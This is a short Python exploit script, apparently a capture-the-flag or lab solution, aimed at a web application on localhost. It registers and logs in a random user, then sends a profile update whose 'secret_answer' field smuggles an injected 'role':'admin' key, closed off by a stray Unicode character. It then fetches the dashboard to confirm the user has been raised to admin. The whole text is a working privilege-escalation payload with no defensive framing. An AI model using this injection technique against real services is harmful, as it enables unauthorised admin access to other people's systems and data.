#! /usr/bin/env python3
import requests

TARGET_URL = 'http://localhost:3000'

s = requests.session()

def register():
    import random
    from string import ascii_lowercase, ascii_uppercase, digits, punctuation
    username = ''.join(random.choices(ascii_lowercase, k=20))
    password = ''.join(random.choices(ascii_uppercase) + random.choices(ascii_lowercase, k=5) + random.choices(digits, k=5) + random.choices(punctuation, k=2))
    s.post(url_path('/register'), json={'username': username, 'password': password})
    return username, password

def login(username, password):
    s.post(url_path('/login'), json={'username': username, 'password': password})

def update_profile(payload):
    r = s.put(url_path('/profile'), json=payload)
    print(r.text)

def get_dashboard():
    r = s.get(url_path('/dashboard'))
    return r.content
    
if __name__ == "__main__":
    username, password = register()
    login(username, password)
    payload = {
        "phone":"1234567890",
        "credit_card":"1111111111111111",
        "secret_question":'test',
        "secret_answer":'a", "role":"admin"}\U00014321',
        "current_password":password
    }
    update_profile(payload)
    print(get_dashboard())
